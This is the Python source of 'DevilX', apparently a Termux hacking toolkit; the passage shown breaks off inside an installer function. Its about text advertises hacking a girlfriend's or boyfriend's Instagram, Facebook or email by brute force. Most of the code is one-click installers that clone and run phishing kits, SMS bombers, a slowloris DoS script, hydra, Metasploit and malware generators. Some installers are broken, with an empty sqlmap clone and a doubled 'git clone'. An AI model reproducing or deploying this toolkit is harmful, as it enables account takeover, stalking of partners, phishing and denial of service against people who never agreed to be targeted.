# /bin/python3 !
# setting up things

#Importing modules and libraries

from __future__ import absolute_import
from __future__ import print_function
import os
import time
import random
import array
import requests
from time import sleep
import hashlib
import threading
import sys
from bs4 import BeautifulSoup
import smtplib

# Setting up looks

banner = """\033[1;91m
▓█████▄ ▓█████ ██▒   █▓ ██▓ ██▓    ▒██   ██▒
▒██▀ ██▌▓█   ▀▓██░   █▒▓██▒▓██▒    ▒▒ █ █ ▒░
░██   █▌▒███   ▓██  █▒░▒██▒▒██░    ░░  █   ░
░▓█▄   ▌▒▓█  ▄  ▒██ █░░░██░▒██░     ░ █ █ ▒ 
░▒████▓ ░▒████▒  ▒▀█░  ░██░░██████▒▒██▒ ▒██▒
 ▒▒▓  ▒ ░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░▒▒ ░ ░▓ ░
 ░ ▒  ▒  ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░░░   ░▒ ░
 ░ ░  ░   Created by: MrHacker-X    ░    ░  
   ░       ░  ░ version: 0.91.1   ░ ░    ░  
 ░                 ░   """


about = """
\033[1;91m[*] introduction:
>>>\033[1;97m DevilX is a multi featured tool for termux user. This tool is written in python3, This tool is very user friendly and easy to use. You can do lot's of things with this tool like we've given 6 features with different category. Like you can gather information of your target's Email ID, Target's Phone Number, Target's IP location. And many things that you can experience by only using this tool. You can install 110 hacking tool in your termux and we made easy to find tool for installation, Because we've arranged tool by alphabatically. You can install just in one click without any error. 

\033[1;91m[*] Overview:
>>> \033[1;97mYou can hack your GF/BF Insta facebook or email ID by just one click. We used bruteforcing technique to hack accounts. You can Install \033[1;91m100+ hacking tool\033[1;97m in your termux. You can Track exact location of any kind of IP Addresses. You can Generate unhacable password that can't be hacked. You can scrap wesites By just one click, without any effort. you can download website's source file just in on click. You can crack 6 kind of encrypted word just in one click by \033[1;91m48200+ word/second\033[1;97m]. And that's it. You can contact me via instagram, profile username is given down below.

\033[1;91m[*] Issue:
>>> \033[1;97mIf you're facing any error or issue while using this tool then you can just message me on Instagram. Go on 'Connect with US' section on main menu. And also I've given my social media profile username down below.

\033[1;91m[*] My Social media profile:

\033[1;91m>>> \033[1;97mInstagram: 0hacker_x0
\033[1;91m>>> \033[1;97mGithub   : MrHacker-X
\033[1;91m>>> \033[1;97mYouTube  : @Technolex
\033[1;91m>>> \033[1;97mTelegram : hackwithalex
\033[1;91m>>> \033[1;97mFacebook : hackerxmr

\033[1;91m>>> \033[1;97mIf you want to copy my code then give me credit.
"""

main_menu = """
        \033[1;91m[??] Select a category:

        \033[1;91m[01] \033[1;97mBruteForce Attack
        \033[1;91m[02] \033[1;97mWeb Scraping
        \033[1;91m[03] \033[1;97mInformation Gathering
        \033[1;91m[04] \033[1;97mHash Cracking
        \033[1;91m[05] \033[1;97mPassword Generator
        \033[1;91m[06] \033[1;97mTool Installer
        \033[1;91m[07] \033[1;97mConnect With US
        \033[1;91m[08] \033[1;97mAbout
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """


brute = """
        \033[1;91m[??] Select an option:

        \033[1;91m[01] \033[1;97mHack Email
        \033[1;91m[02] \033[1;97mHack Facebook
        \033[1;91m[03] \033[1;97mHack Instagram
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        devilx>> """

webscr = """
        \033[1;91m[??] Select an option:

        \033[1;91m[01] \033[1;97mScrap an web page
        \033[1;91m[02] \033[1;97mClone website Page
        \033[1;91m[03] \033[1;97mClone Website
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """

getinfo = """
        \033[1;91m[??] Select an option:

        \033[1;91m[01] \033[1;97mTrack IP Address
        \033[1;91m[02] \033[1;97mE-mail Information
        \033[1;91m[03] \033[1;97mPhone Information
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """

crackhash = """
        \033[1;91m[??] Select an option:

        \033[1;91m[01] \033[1;97mMD5
        \033[1;91m[02] \033[1;97mSHA1
        \033[1;91m[03] \033[1;97mSHA224
        \033[1;91m[04] \033[1;97mSHA256
        \033[1;91m[05] \033[1;97mSHA384
        \033[1;91m[06] \033[1;97mSHA512
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """

pass_mod = """
        \033[1;91m[??] Select password mode:

        \033[1;91m[01] \033[1;97mDefault
        \033[1;91m[02] \033[1;97mCustom
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """

word_mod = """
        \033[1;91m[??] Select wordlist mode:

        \033[1;91m[01] \033[1;97mDefault
        \033[1;91m[02] \033[1;97mCustom
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """

soc = """
        \033[1;91m[?] Select any options

        \033[1;91m[01] \033[1;97mInstagram
        \033[1;91m[02] \033[1;97mFacebook
        \033[1;91m[03] \033[1;97mGithub
        \033[1;91m[04] \033[1;97mYouTube
        \033[1;91m[05] \033[1;97mTelegram
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """

alltool = """
        \033[1;91m[??] Select any Tool: 

        \033[1;91m[01]\033[1;97m 007-TheBond
        \033[1;91m[02]\033[1;97m AdminHack
        \033[1;91m[03]\033[1;97m AllHackingTools
        \033[1;91m[04]\033[1;97m AOXdeface
        \033[1;91m[05]\033[1;97m apktool
        \033[1;91m[06]\033[1;97m Asura
        \033[1;91m[07]\033[1;97m B4Bomber
        \033[1;91m[08]\033[1;97m BannerX
        \033[1;91m[09]\033[1;97m Beast_Bomber
        \033[1;91m[10]\033[1;97m beyawak
        \033[1;91m[11]\033[1;97m Brutegram
        \033[1;91m[12]\033[1;97m BruteX
        \033[1;91m[13]\033[1;97m Brutex \033[1;91m[MrHacker-X]
        \033[1;91m[14]\033[1;97m CAM-DUMPER
        \033[1;91m[15]\033[1;97m CloneWeb
        \033[1;91m[16]\033[1;97m Cracker-Tool
        \033[1;91m[17]\033[1;97m DarkFly
        \033[1;91m[18]\033[1;97m DecodeX
        \033[1;91m[19]\033[1;97m DefGen
        \033[1;91m[20]\033[1;97m demozz
        \033[1;91m[21]\033[1;97m Dh-All
        \033[1;91m[22]\033[1;97m DirAttack
        \033[1;91m[23]\033[1;97m dnsmap
        \033[1;91m[24]\033[1;97m DVR-Exploiter
        \033[1;91m[25]\033[1;97m EasY-HaCk
        \033[1;91m[26]\033[1;97m Findomain
        \033[1;91m[27]\033[1;97m FreeFire-Phishing
        \033[1;91m[28]\033[1;97m fsociety
        \033[1;91m[29]\033[1;97m GenVirus
        \033[1;91m[30]\033[1;97m GeonumWh
        \033[1;91m[31]\033[1;97m GH05T-INSTA
        \033[1;91m[32]\033[1;97m Gmail-Hack
        \033[1;91m[33]\033[1;97m Hacked
        \033[1;91m[34]\033[1;97m Hackerwasi
        \033[1;91m[35]\033[1;97m hacklock
        \033[1;91m[36]\033[1;97m Hammer
        \033[1;91m[37]\033[1;97m HCORat
        \033[1;91m[38]\033[1;97m h-sploit-paylod
        \033[1;91m[39]\033[1;97m httpfy
        \033[1;91m[40]\033[1;97m HXP-Ducky
        \033[1;91m[41]\033[1;97m infect
        \033[1;91m[42]\033[1;97m InfoGX
        \033[1;91m[43]\033[1;97m instahack
        \033[1;91m[44]\033[1;97m InstaReport
        \033[1;91m[45]\033[1;97m ipdrone
        \033[1;91m[46]\033[1;97m IP_Rover
        \033[1;91m[47]\033[1;97m jarvis-welcome
        \033[1;91m[48]\033[1;97m kalimux
        \033[1;91m[49]\033[1;97m Kiss-In-Termux
        \033[1;91m[50]\033[1;97m LinuxX
        \033[1;91m[51]\033[1;97m LordPhish
        \033[1;91m[52]\033[1;97m Lucifer
        \033[1;91m[53]\033[1;97m maskphish
        \033[1;91m[54]\033[1;97m M-dork
        \033[1;91m[55]\033[1;97m Mega-File-Stealer
        \033[1;91m[56]\033[1;97m Metasploit
        \033[1;91m[57]\033[1;97m modded-ubuntu
        \033[1;91m[58]\033[1;97m mrphish
        \033[1;91m[59]\033[1;97m MyServer
        \033[1;91m[60]\033[1;97m netscan
        \033[1;91m[61]\033[1;97m nikto
        \033[1;91m[62]\033[1;97m nmap
        \033[1;91m[63]\033[1;97m onex
        \033[1;91m[64]\033[1;97m osi.ig
        \033[1;91m[65]\033[1;97m Osintgram
        \033[1;91m[66]\033[1;97m parrot-in-termux
        \033[1;91m[67]\033[1;97m PassX
        \033[1;91m[68]\033[1;97m PUBG-BGMI_Phishing
        \033[1;91m[69]\033[1;97m Pureblood
        \033[1;91m[70]\033[1;97m Pycompile
        \033[1;91m[71]\033[1;97m qurxin
        \033[1;91m[72]\033[1;97m RED_HAWK
        \033[1;91m[73]\033[1;97m rsecxxx-leak
        \033[1;91m[74]\033[1;97m saycheese
        \033[1;91m[75]\033[1;97m ScannerX
        \033[1;91m[76]\033[1;97m seeker
        \033[1;91m[77]\033[1;97m seeu
        \033[1;91m[78]\033[1;97m Short-Boy
        \033[1;91m[79]\033[1;97m slowloris
        \033[1;91m[80]\033[1;97m SocialBox-Termux
        \033[1;91m[81]\033[1;97m SploitX
        \033[1;91m[82]\033[1;97m sqlmap
        \033[1;91m[83]\033[1;97m TBomb
        \033[1;91m[84]\033[1;97m TeleGram-Scraper
        \033[1;91m[85]\033[1;97m TermuxArch
        \033[1;91m[86]\033[1;97m TermuxCyberArmy
        \033[1;91m[87]\033[1;97m termux-desktop
        \033[1;91m[88]\033[1;97m termux-fingerprint
        \033[1;91m[89]\033[1;97m Termux-heroku-cli
        \033[1;91m[90]\033[1;97m termux-key
        \033[1;91m[91]\033[1;97m termux-snippets
        \033[1;91m[92]\033[1;97m thc-hydra
        \033[1;91m[93]\033[1;97m toolss
        \033[1;91m[94]\033[1;97m Tool-X
        \033[1;91m[95]\033[1;97m TORhunter
        \033[1;91m[96]\033[1;97m TraceX
        \033[1;91m[97]\033[1;97m TraceX-GUI
        \033[1;91m[98]\033[1;97m Traper-X
        \033[1;91m[99]\033[1;97m tstyle
        \033[1;91m[100]\033[1;97m tunnel
        \033[1;91m[101]\033[1;97m userfinder
        \033[1;91m[102]\033[1;97m Venomsploit
        \033[1;91m[103]\033[1;97m Viridae
        \033[1;91m[104]\033[1;97m WannaTool
        \033[1;91m[105]\033[1;97m websploit
        \033[1;91m[106]\033[1;97m WhSms
        \033[1;91m[107]\033[1;97m Xteam
        \033[1;91m[108]\033[1;97m Youtube-Pro
        \033[1;91m[109]\033[1;97m zphisher
        \033[1;91m[110]\033[1;97m zVirus-Gen
        \033[1;91m[_B_]\033[1;97m Back
        \033[1;91m[_Q_]\033[1;97m Quit

        \033[1;91mdevilx>> """

################### All tool installation function ####################


# 01 seeker
def seeker():
    print("\n\033[1;91m[*]\033[1;97m Installing seeker.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/thewhiteh4t/seeker.git/")
    os.system("mv seeker /$HOME")
    os.system("cd /$HOME/seeker")
    os.system("chmod +x *")
    os.system("./install.sh")
    print()
    print("\033[1;91m[*]\033[1;97m Seeker is installed successfully In your Termux. You can find this tool in HOME directory\n")

# 02 findomain
def findomain():
    print("\n\033[1;91m[*]\033[1;97m Installing Findomain.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install rust make perl -y")
    os.system("apt install findomain -y")
    print()
    print("\033[1;91m[*]\033[1;97m Findomain is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access any time this tool by command 'findomain'")
    print()

# 03 /1N3/BruteX
def brutxx():
    print("\n\033[1;91m[*]\033[1;97m Installing BruteX.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/1N3/BruteX.git/")
    os.system("mv BruteX /$HOME/Brutex")
    os.system("cd /$HOME/Brutex")
    os.system("chmod +x *")
    os.system("./install")
    print()
    print("\033[1;91m[*]\033[1;97m BruteX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can find BruteX on HOME Directory.")
    print()

# 04 ToolX
def toolx():
    print("\n\033[1;91m[*]\033[1;97m Installing Tool-X.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/ekadanuarta/Tool-X.git/")
    os.system("mv Tool-X /$HOME")
    os.system("cd /$HOME/Tool-X")
    os.system("chmod +x *")
    os.system("./install")
    print()
    print("\033[1;91m[*]\033[1;97m Tool-X is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access Tool-X by command 'toolx'.")
    print()

# 05 darkfly
def darkfly():
    print("\n\033[1;91m[*]\033[1;97m Installing DarkFly.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/Ranginang67/DarkFly-2019.1")
    os.system("mv DarkFly-2019.1 /$HOME")
    os.system("cd /$HOME/DarkFly-2019.1")
    os.system("chmod +x *")
    os.system("python install.py install")
    print()
    print("\033[1;91m[*]\033[1;97m DarkFly is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access DarkFly by command 'DarkFly'.")
    print()

# 06 brutex mrhacker-x
def mrbrutex():
    print("\n\033[1;91m[*]\033[1;97m Installing BruteX.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/BruteX.git/")
    os.system("mv BruteX /$HOME")
    os.system("cd /$HOME/BruteX")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m BruteX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find BruteX on your Termux's home directory.")
    print()

# 07 saycheese
def saycheese():
    print("\n\033[1;91m[*]\033[1;97m Installing saycheese.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/saycheese.git/")
    os.system("mv saycheese /$HOME")
    os.system("cd /$HOME/saycheese")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m saycheese is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find saycheese on your termux's home directory.")
    print()

# 08 traper x
def traperx():
    print("\n\033[1;91m[*]\033[1;97m Installing Traper-X.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/Traper-X.git/")
    os.system("mv Traper-X /$HOME")
    os.system("cd /$HOME/Traper-X")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m Traper-X is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Traper-X on your termux's home directory.")
    print()

# 09 tracex
def tracex():
    print("\n\033[1;91m[*]\033[1;97m Installing TraceX.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/TraceX")
    os.system("mv TraceX /$HOME")
    os.system("cd /$HOME/TraceX")
    os.system("chmod +x *")
    os.system("./setup_trmx")
    print()
    print("\033[1;91m[*]\033[1;97m TraceX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TraceX on your termux's home directory.")
    print()

# 10 infogx
def infogx():
    print("\n\033[1;91m[*]\033[1;97m Installing InfoGX.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/InfoGX.git/")
    os.system("mv InfoGX /$HOME")
    os.system("cd /$HOME/InfoGX")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m InfoGX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access InfoGX by command 'infogx'.")
    print()

# 11 toolss

def toolss():
    print("\n\033[1;91m[*]\033[1;97m Installing toolss.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/AnonHackerr/toolss")
    os.system("mv toolss /$HOME")
    os.system("cd /$HOME/toolss")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m toolss is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find toolss on your termux's home directory.")
    print()

# 12 tbomb
def tbomb():
    print("\n\033[1;91m[*]\033[1;97m Installing TBomb.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install python3 -y")
    os.system("pip3 install tbomb")
    print()
    print("\033[1;91m[*]\033[1;97m TBomb is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access TBomb by command 'tbomb'.")
    print()

# 13 zphisher
def zphish():
    print("\n\033[1;91m[*]\033[1;97m Installing zphisher.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install tur-repo zphisher -y")
    print()
    print("\033[1;91m[*]\033[1;97m zphisher is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access zphisher by command 'zphisher'.")
    print()

# 14 nmap
def nmap():
    print("\n\033[1;91m[*]\033[1;97m Installing nmap.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install nmap -y")
    print()
    print("\033[1;91m[*]\033[1;97m nmap is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access nmap by command 'nmap'.")
    print()

# 15 hydra
def hydra():
    print("\n\033[1;91m[*]\033[1;97m Installing thc-hydra.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install python php curl wget git nano -y")
    os.system("git clone https://github.com/vanhauser-thc/thc-hydra")
    os.system("mv thc-hydra /$HOME")
    os.system("cd /$HOME/thc-hydra")
    os.system("chmod +x *")
    os.system("./configure")
    os.system("make")
    os.system("make install")
    print()
    print("\033[1;91m[*]\033[1;97m thc-hydra is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find thc-hydra on your termux's home directory.")
    print()

# 16 sqlmap
def sqlmap():
    print("\n\033[1;91m[*]\033[1;97m Installing sqlmap.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone ")
    os.system("mv  /$HOME")
    os.system("cd /$HOME/")
    os.system("chmod +x *")
    os.system("")
    print()
    print("\033[1;91m[*]\033[1;97m sqlmap is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find sqlmap on your termux's home directory.")
    print()

# 17 nikto

def nikto():
    print("\n\033[1;91m[*]\033[1;97m Installing nikto.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git perl -y")
    os.system("git clone https://github.com/sullo/nikto ")
    os.system("mv nikto /$HOME")
    os.system("cd /$HOME/nikto/program")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m nikto is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find nikto on your termux's home directory.")
    print()


# 18 fsociety
def fsociety():
    print("\n\033[1;91m[*]\033[1;97m Installing fsociety.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 python3 -y")
    os.system("pip install requests")
    os.system("git clone git clone https://github.com/Manisso/fsociety")
    os.system("mv fsociety /$HOME")
    os.system("cd /$HOME/fsociety")
    os.system("chmod +x *")
    os.system("")
    print()
    print("\033[1;91m[*]\033[1;97m fsociety is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find fsociety on your termux's home directory.")
    print()

# 19 slowloris
def slowloris():
    print("\n\033[1;91m[*]\033[1;97m Installing slowloris.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python3 -y")
    os.system("git clone https://github.com/gkbrk/slowloris.git")
    os.system("mv slowloris /$HOME")
    os.system("cd /$HOME/slowloris")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m slowloris is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find slowloris on your termux's home directory.")
    print()

# 20 metasploit
def metasp():
    print("\n\033[1;91m[*]\033[1;97m Installing Metasploit.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few minutes to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install wget curl openssh git ncurses-utils -y")
    os.system("wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh ")
    os.system("mv metasploit.sh /$HOME")
    os.system("cd /$HOME")
    os.system("chmod +x *")
    os.system("./metasploit.sh")
    print()
    print("\033[1;91m[*]\033[1;97m Metasploit is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access metasploit by command 'msfconsole'.")
    print()

# 21 easyhack
def easyhack():
    print("\n\033[1;91m[*]\033[1;97m Installing EasY_HaCk.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/sabri-zaki/EasY_HaCk")
    os.system("mv EasY_HaCk /$HOME")
    os.system("cd /$HOME/EasY_HaCk")
    os.system("chmod +x *")
    os.system("sh install.sh")
    print()
    print("\033[1;91m[*]\033[1;97m EasY_HaCk is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'EasY-HaCk' to access EasY_HaCk.")
    print()

# 22 infect
def infect():
    print("\n\033[1;91m[*]\033[1;97m Installing infect.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/noob-hackers/infect")
    os.system("mv infect /$HOME")
    os.system("cd /$HOME/infect")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m infect is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find infect on your termux's home directory.")
    print()

# 23 onex
def onex():
    print("\n\033[1;91m[*]\033[1;97m Installing onex.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/jackind424/onex")
    os.system("mv onex /$HOME")
    os.system("cd /$HOME/onex")
    os.system("chmod +x *")
    os.system("sh install")
    print()
    print("\033[1;91m[*]\033[1;97m onex is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'onex' to access onex.")
    print()

# 24 dnsmap
def dnsmp():
    print("\n\033[1;91m[*]\033[1;97m Installing dnsmap.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install dnsmap -y")
    print()
    print("\033[1;91m[*]\033[1;97m dnsmap is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access dnsmap by command 'dnsmap'.")
    print()

# 25 SocialBox-Termux
def toolboxt():
    print("\n\033[1;91m[*]\033[1;97m Installing SocialBox-Termux.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/samsesh/SocialBox-Termux.git/")
    os.system("mv SocialBox-Termux /$HOME")
    os.system("cd /$HOME/SocialBox-Termux")
    os.system("chmod +x *")
    os.system("./install-sb.sh")
    print()
    print("\033[1;91m[*]\033[1;97m SocialBox-Termux is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find SocialBox-Termux on your termux's home directory.")
    print()

# 26 maskphish
def maskphish():
    print("\n\033[1;91m[*]\033[1;97m Installing maskphish.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/jaykali/maskphish.git/")
    os.system("mv maskphish /$HOME")
    os.system("cd /$HOME/maskphish")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m maskphish is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find maskphish on your termux's home directory.")
    print()

# 27 mrphish
def mrphish():
    print("\n\033[1;91m[*]\033[1;97m Installing mrphish.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/noob-hackers/mrphish")
    os.system("mv mrphish /$HOME")
    os.system("cd /$HOME/mrphish")
    os.system("chmod +x *")
    os.system("bash setup")
    print()
    print("\033[1;91m[*]\033[1;97m mrphish is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find mrphish on your termux's home directory.")
    print()

# 28 hacklock
def hacklock():
    print("\n\033[1;91m[*]\033[1;97m Installing hacklock.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/noob-hackers/hacklock")
    os.system("mv hacklock /$HOME")
    os.system("cd /$HOME/hacklock")
    os.system("chmod +x *")
    os.system("bash setup")
    print()
    print("\033[1;91m[*]\033[1;97m hacklock is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find hacklock on your termux's home directory.")
    print()

# 29 AllHackingTools
def AllHackingTools():
    print("\n\033[1;91m[*]\033[1;97m Installing AllHackingTools.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/mishakorzik/AllHackingTools")
    os.system("mv AllHackingTools /$HOME")
    os.system("cd /$HOME/AllHackingTools")
    os.system("termux-setup-storage")
    os.system("chmod +x *")
    os.system("bash Install.sh")
    os.system("bash fix.sh")
    print()
    print("\033[1;91m[*]\033[1;97m AllHackingTools is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'msdconsole' to access AllHackingTools.")
    print()

# 30 instahack
def instahack():
    print("\n\033[1;91m[*]\033[1;97m Installing instahack.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 wget curl -y")
    os.system("git clone https://github.com/evildevill/instahack.git/")
    os.system("mv instahack /$HOME")
    os.system("cd /$HOME/instahack")
    os.system("chmod +x *")
    os.system("bash setup_env.sh")
    print()
    print("\033[1;91m[*]\033[1;97m instahack is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find instahack on your termux's home directory.")
    print()

# 31 kalimux
def kalimux():
    print("\n\033[1;91m[*]\033[1;97m Installing kalimux.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/noob-hackers/kalimux")
    os.system("mv kalimux /$HOME")
    os.system("cd /$HOME/kalimux")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m kalimux is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find kalimux on your termux's home directory.")
    print()

# 32 LinuxX
def LinuxX():
    print("\n\033[1;91m[*]\033[1;97m Installing LinuxX.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/LinuxX.git/")
    os.system("mv LinuxX /$HOME")
    os.system("cd /$HOME/LinuxX")
    os.system("chmod +x *")
    os.system("./setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m LinuxX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'linuxx' to access LinuxX.")
    print()

# 33 TermuxArch
def TermuxArch():
    print("\n\033[1;91m[*]\033[1;97m Installing TermuxArch.....\n")
